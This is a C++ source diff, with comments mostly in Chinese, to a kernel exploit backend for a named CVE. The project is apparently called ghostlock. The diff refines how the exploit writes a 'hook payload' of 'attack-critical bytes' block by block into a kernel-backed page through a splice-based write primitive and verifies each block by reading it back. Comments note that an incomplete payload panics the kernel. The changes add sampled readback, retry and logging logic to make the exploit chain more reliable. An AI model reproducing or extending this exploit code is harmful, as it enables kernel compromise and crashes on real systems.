@@ -18,6 +18,9 @@
 #include <unistd.h>
 
 namespace ghostlock::backend::cve_2026_43284::steps {
+    /** 日志粒度：每 512 字节一行（= 宽 16 时每 32 块）。失败行不受这个门限约束，逐块打印。
+     *  参照实现（ghostlock-app-ref@5f184760）也是每 512 字节一行。 */
+    inline constexpr std::size_t kLogEveryBytes = 512U;
     /** Names the caller can print; static storage, so the pointer stays valid. */
     inline constexpr const char *kImageEmpty = "step-image-empty";
     inline constexpr const char *kImageNotAligned = "step-width-zero";
@@ -176,6 +179,10 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         body.offset = plan.payload_file_offset;
         body.width = request.width;
         body.channel = request.channel;
+        /* 钩子的载荷是**攻击关键字节**：一块没落地，站点分支就会跳进零字节里（内核 panic）。
+         * 所以这一段显式全查（verify_every=0），不随调用方的抽样间隔；代价是载荷块数（≤0x9D8/16
+         * ≈ 158 块）次回读，而它换来的是「载荷逐块都在」这条证据。载体那 769 块的抽样是另一回事。 */
+        body.verify_every = 0U;
         if (!write_image_verified(body, refusal)) {
             /* 载荷没写完 ⇒ 站点块从未被写，分支没有生效，拒绝名沿用载荷那一段（step-write-refused /
              * step-verify-failed）。 */
@@ -329,6 +336,23 @@ namespace ghostlock::backend::cve_2026_43284::steps {
         }
         return kWaitTimeout;
     }
+    bool verify_this_block(std::size_t block, std::size_t blocks,
+                           std::size_t verify_every, bool after_failure) noexcept {
+        if (block >= blocks) {
+            return false;
+        }
+        if (verify_every == 0U) {
+            return true;
+        }
+        if (after_failure) {
+            return true;
+        }
+        if (block == 0U || block + 1U == blocks) {
+            return true;
+        }
+        return (block % verify_every) == 0U;
+    }
+
     bool write_image_verified(WriteRequest &request, const char **refusal) noexcept {
         if (request.access == nullptr || request.params == nullptr) {
             *refusal = kNoAccess;
@@ -343,6 +367,10 @@ namespace ghostlock::backend::cve_2026_43284::steps {
             return false;
         }
         const std::size_t blocks = (request.image.size() + request.width - 1U) / request.width;
+        request.failed_block = kNoFailedBlock;
+        /* 上一次尝试没通过（重发过、或回读不符过）⇒ 下一块一定回读：这条通道此刻不可信，
+         * 抽样不适用于它。只有真正做过一次尝试才会置位，所以「没抽样」不会污染它。 */
+        bool after_failure = false;
         for (std::size_t block = 0U; block < blocks; ++block) {
             const std::size_t at = block * request.width;
             const std::size_t take = request.image.size() - at < request.width ?
@@ -352,6 +380,9 @@ namespace ghostlock::backend::cve_2026_43284::steps {
             std::memcpy(in, request.image.data() + at, take);
             request.params->offset = request.offset + at;
             request.params->offset_set = true;
+            /* 抽样与否只决定写完之后读不读；写这一段的路径（preimage → vector → splice）对两者完全相同，
+             * 落盘的仍是同一个页 —— 页的来源语义不因抽样而变。 */
+            const bool sampled = verify_this_block(block, blocks, request.verify_every, after_failure);
             /* 每块的事实（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/chain.cpp:215-250
              *  —— 那边逐块：offset = region.offset + b*16、长度 = kChainBlockBytes、写 16 字节；
              *  patch #1 的同款循环在 steps/crash_dump.cpp:40-50；
@@ -366,21 +397,28 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                 std::snprintf(message, sizeof(message), "step-write-refused:%s",
                               ghostlock::contract::KernelAccess::status_name(written.status));
                 *refusal = message;
+                request.failed_block = block;
                 return false;
+            }
+            if ((at % kLogEveryBytes) == 0U) {
+                GL_LOGI("block[%zu]: wrote=%zu/%zu offset=%llu budget_ms=%llu", at, written.value, request.width,
+                        static_cast<unsigned long long>(request.offset + at),
+                        static_cast<unsigned long long>(request.budget_ms));
+            }
+            if (!sampled) {
+                /* 抽样块之外只写不读：省下的正是这一块的一次 helper exec（载体不可直读时一回读=一次
+                 * fork+exec）。判据没有放宽 —— 抽样间隔是调用方给的判据，任何一次真做了的回读不符
+                 * 仍然整段失败。 */
+                if ((at % kLogEveryBytes) == 0U) {
+                    GL_LOGI("block[%zu]: written, not read back (verify_every=%zu)", at, request.verify_every);
+                }
+                after_failure = false;
+                continue;
             }
             /* 写是派发式的（成功只到 Dispatched）：落盘要等内核处理，所以这里做**有界重试**。
              * 耐心由调用方给（request.budget_ms；0 = 不重试，与旧行为一致）—— 等多久是上层的事。 */
             const auto verify_deadline = std::chrono::steady_clock::now() +
                                          std::chrono::milliseconds(request.budget_ms);
-            /*
-             * 粒度对齐参照实现（ghostlock-app-ref@5f184760 每 512 字节一行）：每 32 块打一行。
-             * 失败路径（resent / verify failed / landing miss）仍逐块打印，定位能力不减。
-             */
-            if ((at % 32U) == 0U) {
-                GL_LOGI("block[%zu]: wrote=%zu/%zu offset=%llu budget_ms=%llu", at, written.value, request.width,
-                        static_cast<unsigned long long>(request.offset + at),
-                        static_cast<unsigned long long>(request.budget_ms));
-            }
             std::size_t tries = 0U;
             const auto block_start = std::chrono::steady_clock::now();
             for (;;) {
@@ -397,12 +435,14 @@ namespace ghostlock::backend::cve_2026_43284::steps {
             const auto back = request.access->read(0U, request.width, request.channel, *request.params);
                 /* 回读结果本身（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/steps/chain.cpp:252-262
                  *  —— 那边写完按同一 offset 读回一块再逐字节比较；patch #1 的同款校验在 crash_dump.cpp:52-66）。 */
-                if ((at % 32U) == 0U) {   /* 与参照实现同粒度：每 512 字节一行；失败行仍逐块 */
+                const bool matches = back.ok() && back.value.size() == request.width &&
+                                     std::memcmp(back.value.data(), in, request.width) == 0;
+                /* 与参照实现同粒度：每 512 字节一行（= 宽 16 时每 32 块）；**不符的那一次逐块打印**，
+                 * 抽样只决定读不读，不决定失败行打不打。 */
+                if (!matches || (at % kLogEveryBytes) == 0U) {
                 GL_LOGI("image block[%zu] readback: off=%llu len=%zu ok=%d size=%zu same=%d head=%02x%02x%02x%02x",
                         at, static_cast<unsigned long long>(request.offset + at), request.width,
-                        back.ok() ? 1 : 0, back.value.size(),
-                        (back.ok() && back.value.size() == request.width &&
-                         std::memcmp(back.value.data(), in, request.width) == 0) ? 1 : 0,
+                        back.ok() ? 1 : 0, back.value.size(), matches ? 1 : 0,
                         back.ok() && back.value.size() > 0U
                             ? static_cast<unsigned>(std::to_integer<std::uint8_t>(back.value[0])) : 0U,
                         back.ok() && back.value.size() > 1U
@@ -412,16 +452,18 @@ namespace ghostlock::backend::cve_2026_43284::steps {
                         back.ok() && back.value.size() > 3U
                             ? static_cast<unsigned>(std::to_integer<std::uint8_t>(back.value[3])) : 0U);
                 }
-                if (back.ok() && back.value.size() == request.width &&
-                    std::memcmp(back.value.data(), in, request.width) == 0) {
+                if (matches) {
                     /* How long did this block take, and how many tries? A block that never matches
                      * burns the whole budget, which is what turns a five second chain into minutes. */
                     const auto block_us = std::chrono::duration_cast<std::chrono::microseconds>(
                         std::chrono::steady_clock::now() - block_start).count();
                     GL_LOGI("block[%zu]: landed tries=%zu took=%lld us", at, tries,
                             static_cast<long long>(block_us));
+                    /* 这一块重发过 ⇒ 通道刚才没通过 ⇒ 下一块一定回读（verify_this_block 的第二条）。 */
+                    after_failure = tries > 1U;
                     break;  /* landed：预算内比中 */
                 }
+                after_failure = true;
                 if (std::chrono::steady_clock::now() >= verify_deadline) {
                     const unsigned char *want = reinterpret_cast<const unsigned char *>(in);
                     const unsigned char *got = back.ok() ? reinterpret_cast<const unsigned char *>(back.value.data()) : nullptr;
@@ -451,6 +493,7 @@ namespace ghostlock::backend::cve_2026_43284::steps {
             }
             *refusal = kVerifyFailed;  /* budget-exhausted：预算用尽仍不中 */
                     GL_LOGI("block[%zu]: budget exhausted after %zu tries", at, tries);
+                    request.failed_block = block;
                     return false;
                 }
                 ::usleep(2000);  /* 一个轮询间隔（2 ms） */
